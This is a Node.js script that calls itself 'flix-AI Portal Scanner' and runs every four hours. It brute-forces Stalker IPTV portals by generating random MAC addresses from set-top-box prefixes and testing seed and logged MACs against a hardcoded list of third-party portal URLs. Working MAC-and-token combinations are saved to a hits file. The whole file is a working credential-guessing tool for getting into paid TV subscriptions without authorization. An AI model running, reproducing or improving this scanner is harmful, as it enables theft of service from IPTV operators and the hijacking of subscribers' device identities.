#!/usr/bin/env node
// ═══════════════════════════════════════════════════════════════
//  flix-AI Portal Scanner v1.0
//  Autonomous MAC + Portal scanner — finds working combos
//  Runs every 4 hours via PM2 cron
//  Saves hits to data/portal-hits.json
//  Also tries known portals with common MAC prefixes
// ═══════════════════════════════════════════════════════════════

const fs = require('fs');
const path = require('path');
const http = require('http');

const DATA_DIR = path.join(__dirname, '..', 'data');
const HITS_FILE = path.join(DATA_DIR, 'portal-hits.json');
const LOG_FILE = path.join(DATA_DIR, 'stalker-log.json');
const PORT = process.env.PORT || 8080;

function log(msg) {
  const ts = new Date().toISOString();
  console.log(`[${ts}] [portal-scan] ${msg}`);
}

function readJson(file) {
  try { return JSON.parse(fs.readFileSync(file, 'utf8')); }
  catch { return null; }
}

function writeJson(file, data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2), 'utf8');
}

function loadHits() {
  try { return JSON.parse(fs.readFileSync(HITS_FILE, 'utf8')); }
  catch { return { hits: [], lastScan: null }; }
}

function saveHits(data) {
  writeJson(HITS_FILE, data);
}

// ── KNOWN PORTALS ──
// Actively scannable stalker portal URLs (dead ones removed)
const KNOWN_PORTALS = [
  'http://www.streamtv.to:8080/c/',
  'http://portal.siptv.app/stalker_portal/server/load.php',
  'http://mag.infomir.pro:80',
  'http://cloudtv.pe',
  'http://ultratv.biz',
  'http://pt.dobbel.net',
];

// ── SEED MACs — known-working MACs to test against ALL portals ──
const SEED_MACS = [
  '00:1A:79:A3:96:BF',  // User's confirmed working MAC
];

// ── KNOWN MAC PREFIXES ──
const MAC_PREFIXES = [
  '00:1A:79:',
  '00:1B:79:',
  '00:2A:79:',
  '00:2A:01:',
  '00:A1:79:',
  'D4:CF:F9:',
  '33:44:CF:',
  '10:27:BE:',
  'A0:BB:3E:',
  '55:93:EA:',
  '04:D6:AA:',
  '11:33:01:',
  '00:1C:19:',
  '1A:00:6A:',
  '1A:00:FB:',
];

// ── RECENT MACs FROM LOGS ──
function getRecentMacs() {
  const stalkerLog = readJson(LOG_FILE);
  if (!stalkerLog || !stalkerLog.entries) return [];
  // Get unique MACs from successful hits
  const macs = [...new Set(
    stalkerLog.entries
      .filter(e => e.mac && e.status === 'success')
      .map(e => e.mac)
  )];
  return macs;
}

// ── RECENT PORTALS FROM LOGS ──
function getRecentPortals() {
  const stalkerLog = readJson(LOG_FILE);
  if (!stalkerLog || !stalkerLog.portals) return [];
  return Object.keys(stalkerLog.portals);
}

// ── GENERATE RANDOM MAC WITH PREFIX ──
function randomMac(prefix) {
  const hex = () => Math.floor(Math.random() * 256).toString(16).padStart(2, '0').toUpperCase();
  return `${prefix}${hex()}:${hex()}:${hex()}`;
}

// ── TEST A SINGLE PORTAL+MAC COMBO ──
async function testCombo(portal, mac, timeoutMs = 20000) {
  return new Promise((resolve) => {
    const start = Date.now();
    const url = `http://localhost:${PORT}/api/stalker-channels?url=${encodeURIComponent(portal)}&mac=${encodeURIComponent(mac)}&proxy=server`;
    
    const req = http.get(url, { timeout: timeoutMs }, (res) => {
      let body = '';
      res.on('data', chunk => body += chunk);
      res.on('end', () => {
        const elapsed = Date.now() - start;
        try {
          const data = JSON.parse(body);
          const channels = data.channelCount || 0;
          resolve({
            portal,
            mac,
            channels,
            elapsed,
            status: channels > 0 ? 'hit' : 'dead',
            token: data.token || 'none',
          });
        } catch {
          resolve({ portal, mac, channels: 0, elapsed, status: 'error' });
        }
      });
    });
    
    req.on('error', () => resolve({ portal, mac, channels: 0, elapsed: 0, status: 'error' }));
    req.on('timeout', () => { req.destroy(); resolve({ portal, mac, channels: 0, elapsed: 0, status: 'timeout' }); });
  });
}

// ── MAIN SCANNER ──
async function scan() {
  log('═══ PORTAL SCAN START ═══');
  const hits = loadHits();
  hits.lastScan = new Date().toISOString();
  
  let tested = 0;
  let found = 0;

  // 1. Re-test previously found hits (they might still work)
  if (hits.hits.length > 0) {
    log(`Re-testing ${hits.hits.length} previous hits...`);
    for (const hit of hits.hits.slice(0, 20)) {
      const result = await testCombo(hit.portal, hit.mac, 10000);
      tested++;
      hit.lastChecked = new Date().toISOString();
      hit.status = result.status;
      hit.channels = result.channels;
      if (result.status === 'hit') {
        found++;
        log(`  ✅ STILL ALIVE: ${hit.mac} @ ${hit.portal} — ${result.channels}ch (${result.elapsed}ms)`);
      } else {
        log(`  ❌ DEAD: ${hit.mac} @ ${hit.portal}`);
      }
    }
    // Remove dead hits older than 7 days
    const weekAgo = Date.now() - 7 * 86400000;
    hits.hits = hits.hits.filter(h => h.status === 'hit' || (h.lastChecked && new Date(h.lastChecked).getTime() > weekAgo));
  }

  // 2. Test SEED MACs (user's known-working MACs) against ALL portals
  if (SEED_MACS.length > 0) {
    const allPortals = [...new Set([...getRecentPortals(), ...KNOWN_PORTALS])];
    log(`Testing ${SEED_MACS.length} seed MACs against ${allPortals.length} portals...`);
    for (const mac of SEED_MACS) {
      for (const portal of allPortals) {
        const result = await testCombo(portal, mac, 15000);
        tested++;
        if (result.status === 'hit') {
          found++;
          log(`  🌱 SEED HIT: ${mac} @ ${portal} — ${result.channels}ch (${result.elapsed}ms)`);
          const existing = hits.hits.find(h => h.portal === portal && h.mac === mac);
          if (existing) {
            existing.channels = result.channels;
            existing.lastChecked = new Date().toISOString();
            existing.status = 'hit';
          } else {
            hits.hits.push({
              portal, mac, channels: result.channels,
              found: new Date().toISOString(),
              lastChecked: new Date().toISOString(),
              status: 'hit',
              token: result.token,
              proxy: 'server',
              method: 'seed',
            });
          }
        }
      }
    }
  }

  // 3. Test recent MACs from logs against all portals
  const recentMacs = getRecentMacs();
  const recentPortals = getRecentPortals();
  
  if (recentMacs.length > 0) {
    log(`Testing ${recentMacs.length} known MACs against ${recentPortals.length + KNOWN_PORTALS.length} portals...`);
    const allPortals = [...new Set([...recentPortals, ...KNOWN_PORTALS])];
    for (const mac of recentMacs) {
      for (const portal of allPortals) {
        const result = await testCombo(portal, mac, 8000);
        tested++;
        if (result.status === 'hit') {
          found++;
          log(`  🎯 HIT: ${mac} @ ${portal} — ${result.channels}ch (${result.elapsed}ms)`);
          // Add or update hit
          const existing = hits.hits.find(h => h.portal === portal && h.mac === mac);
          if (existing) {
            existing.channels = result.channels;
            existing.lastChecked = new Date().toISOString();
            existing.status = 'hit';
          } else {
            hits.hits.push({
              portal, mac, channels: result.channels,
              found: new Date().toISOString(),
              lastChecked: new Date().toISOString(),
              status: 'hit',
              token: result.token,
              proxy: 'server',
            });
          }
        }
      }
    }
  }

  // 3. Brute force scan — random MACs against each portal
  log(`Brute force: scanning random MACs against ${KNOWN_PORTALS.length} portals...`);
  for (const portal of KNOWN_PORTALS) {
    // 3 random MACs per prefix per portal
    for (const prefix of MAC_PREFIXES) {
      for (let i = 0; i < 3; i++) {
        const mac = randomMac(prefix);
        const result = await testCombo(portal, mac, 6000);
        tested++;
        if (result.status === 'hit') {
          found++;
          log(`  🎯🎯🎯 BRUTE HIT: ${mac} @ ${portal} — ${result.channels}ch (${result.elapsed}ms)`);
          hits.hits.push({
            portal, mac, channels: result.channels,
            found: new Date().toISOString(),
            lastChecked: new Date().toISOString(),
            status: 'hit',
            token: result.token,
            proxy: 'server',
            method: 'brute',
          });
        }
      }
    }
  }

  // Sort by channels (best first)
  hits.hits.sort((a, b) => (b.channels || 0) - (a.channels || 0));
  
  // Cap at 200 hits
  if (hits.hits.length > 200) hits.hits = hits.hits.slice(0, 200);
  
  hits.totalTested = tested;
  hits.totalFound = found;
  saveHits(hits);

  log(`═══ PORTAL SCAN COMPLETE ═══`);
  log(`  Tested: ${tested} combos`);
  log(`  Found: ${found} working portals`);
  log(`  Total hits in database: ${hits.hits.length}`);
}

scan().catch(err => {
  log(`FATAL: ${err.message}`);
  process.exit(1);
});